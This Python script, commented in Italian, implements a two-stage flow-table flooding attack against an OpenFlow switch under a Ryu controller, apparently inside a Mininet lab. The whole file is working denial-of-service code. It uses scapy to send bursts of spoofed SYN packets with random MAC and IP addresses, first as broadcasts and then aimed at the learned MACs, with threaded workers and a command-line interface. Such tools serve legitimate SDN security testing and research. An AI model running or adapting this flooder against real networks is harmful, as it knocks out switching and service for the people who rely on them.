import random
import queue
import argparse
import time

from typing import List
from threading import Thread, Event

from mininet.node import OVSSwitch, Intf

from scapy.all import (
    Ether, IP, TCP, Packet, sendp
)

class FloodAttack:
    """
    mininet> py FloodAttack(s1, s2.intfList()[1], 10, 1, 2, 1).start()
    """

    def __init__(self, switch: OVSSwitch, iface: Intf, npacket: int, threads: int, bsize: int, bdelay: int):
        self.switch = switch
        self.iface = iface
        self.npacket = npacket
        self.threads = threads
        self.bsize = bsize
        self.bdelay = bdelay
        self.macs: List[str] = []
        self._attack_thread: Thread = None
        self._stop_event: Event = Event()
        print("""
---------------------------------------------------------------------------------------------------------------------------------------------------

███████ ██       ██████  ██     ██     ████████  █████  ██████  ██      ███████     ███████ ██       ██████   ██████  ██████  ██ ███    ██  ██████  
██      ██      ██    ██ ██     ██        ██    ██   ██ ██   ██ ██      ██          ██      ██      ██    ██ ██    ██ ██   ██ ██ ████   ██ ██       
█████   ██      ██    ██ ██  █  ██        ██    ███████ ██████  ██      █████       █████   ██      ██    ██ ██    ██ ██   ██ ██ ██ ██  ██ ██   ███ 
██      ██      ██    ██ ██ ███ ██        ██    ██   ██ ██   ██ ██      ██          ██      ██      ██    ██ ██    ██ ██   ██ ██  ██ ██ ██    ██ 
██      ███████  ██████   ███ ███         ██    ██   ██ ██████  ███████ ███████     ██      ███████  ██████   ██████  ██████  ██ ██   ████  ██████ 

----------------------------------------------------------------------------------------------------------------------------------------------------
""")
        print("[+] Switch: {}\n[+] IFace: {}\n".format(self.switch.name, self.iface.name))

    @staticmethod
    def random_mac() -> str:
        octets = [random.randint(0x00, 0xFE) for _ in range(6)]
        octets[0] &= 0xFE
        return ":".join(f"{o:02x}" for o in octets)

    @staticmethod
    def random_ip() -> str:
        subnet: str = "10.0.0"
        return f"{subnet}.{random.randint(1, 254)}"

    @staticmethod
    def random_port() -> int:
        return random.randint(1024, 65535)

    @staticmethod
    def build_packet(src_mac: str, src_ip: str, dst_mac: str, dst_ip: str) -> Packet:
        eth = Ether(src=src_mac, dst=dst_mac)
        ip = IP(src=src_ip, dst=dst_ip)
        tcp = TCP(sport=FloodAttack.random_port(), dport=FloodAttack.random_port(), flags="S")  # SYN
        return eth / ip / tcp

    def send_packets(self, packets: List[Packet]):
        """Invia i pacchetti in burst tramite worker thread, rispettando _stop_event."""
        def _worker(q: queue.Queue, delay: int):
            while not self._stop_event.is_set():
                try:
                    chunk = q.get(block=False)
                except queue.Empty:
                    return
                try:
                    sendp(chunk, iface=self.iface.name, verbose=False)
                    deadline = time.time() + delay
                    while time.time() < deadline:
                        if self._stop_event.is_set():
                            return
                        time.sleep(0.1)
                finally:
                    q.task_done()

        q: queue.Queue = queue.Queue()
        for i in range(0, len(packets), self.bsize):
            q.put(packets[i:i + self.bsize])
            print(f"* Burst[{i}]={len(packets[i:i + self.bsize])}")

        n_workers = min(self.threads, q.qsize())
        workers = []
        for _ in range(n_workers):
            t = Thread(target=_worker, args=(q, self.bdelay), daemon=True)
            t.start()
            workers.append(t)
        q.join()

    def stage_1(self) -> None:
        if self._stop_event.is_set():
            return
        packets: List[Packet] = []
        print("[*] Crafting")
        for _ in range(self.npacket):
            src_mac = FloodAttack.random_mac()
            src_ip = FloodAttack.random_ip()
            packet = FloodAttack.build_packet(src_mac, src_ip, "ff:ff:ff:ff:ff:ff", "10.0.0.255")
            self.macs.append(src_mac)
            packets.append(packet)
        print("[*] Crafted")
        print("[*] Sending")
        self.send_packets(packets)
        print("[*] Sent")

    def stage_2(self) -> None:
        if self._stop_event.is_set():
            return
        local_pool = self.macs.copy()
        random.shuffle(local_pool)
        packets: List[Packet] = []
        print("[*] Crafting")
        for i in range(self.npacket):
            src_mac = FloodAttack.random_mac()
            src_ip = FloodAttack.random_ip()
            dst_mac = local_pool[i % len(local_pool)]
            dst_ip = FloodAttack.random_ip()
            packet = FloodAttack.build_packet(src_mac, src_ip, dst_mac, dst_ip)
            packets.append(packet)
        print("[*] Crafted")
        print("[*] Sending")
        self.send_packets(packets)
        print("[*] Sent")

    def _run(self):
        """Corpo dell'attacco eseguito nel thread interno."""
        print("# [STAGE 1] MAC Presenting")
        self.stage_1()
        if self._stop_event.is_set():
            print("[!] Attacco interrotto dopo stage 1.")
            return
        print()
        print("# [STAGE 2] Flooding")
        self.stage_2()
        print("[+] Attacco completato.")

    def start(self, blocking: bool = False) -> None:
        """
        Avvia l'attacco.

        Parameters
        ----------
        blocking : bool
            False (default) — l'attacco gira in un thread daemon e il metodo
                              ritorna immediatamente, permettendo al monitor di
                              partire in parallelo.
            True            — comportamento originale sincrono (blocca fino al
                              termine dell'attacco).
        """
        self._stop_event.clear()
        if blocking:
            self._run()
        else:
            self._attack_thread = Thread(target=self._run, name="flood-attack", daemon=True)
            self._attack_thread.start()

    def stop(self) -> None:
        """Segnala ai worker di fermarsi e attende la fine del thread."""
        self._stop_event.set()
        if self._attack_thread and self._attack_thread.is_alive():
            self._attack_thread.join(timeout=10)
            if self._attack_thread.is_alive():
                print("[!] Timeout: il thread di attacco non si è fermato.")
            else:
                print("[+] Thread di attacco terminato.")

    def is_running(self) -> bool:
        """True se il thread di attacco è ancora attivo."""
        return self._attack_thread is not None and self._attack_thread.is_alive()

    def join(self, timeout: float = None) -> None:
        """Attende la fine naturale dell'attacco (senza fermarlo)."""
        if self._attack_thread:
            self._attack_thread.join(timeout=timeout)


def main(switch, iface, npacket, threads, bsize, bdelay):
    flood_attack = FloodAttack(switch, iface, npacket, threads, bsize, bdelay)
    flood_attack.start(blocking=True)   # comportamento originale da CLI
    return

if __name__ == "__main__":
    """
    switch: OVSSwitch
    iface: Intf
    npacket: int
    threads: int
    bsize (burstsize): pacchetti per burst
    bdelay (burstdelay): delay tra i burst
    """
    parser = argparse.ArgumentParser(
        description="Flow Table Flooding – attacco bifase su Ryu"
    )
    parser.add_argument("--switch", required=True, help="Switch (es: s1, s2)")
    parser.add_argument("--iface",  required=True, help="Interfaccia verso switch (es: h1-eth0, s2-eth1)")
    parser.add_argument("--npacket", type=int, default=300, help="Numero di pacchetti")
    parser.add_argument("--threads", "-t", type=int, default=4,  help="Numero di threads")
    parser.add_argument("--bsize",   type=int, default=100, help="Pacchetti per burst")
    parser.add_argument("--bdelay",  type=int, default=1,   help="Pausa tra burst in secondi")
    args = parser.parse_args()
    main(args.switch, args.iface, args.npacket, args.threads, args.bsize, args.bdelay)
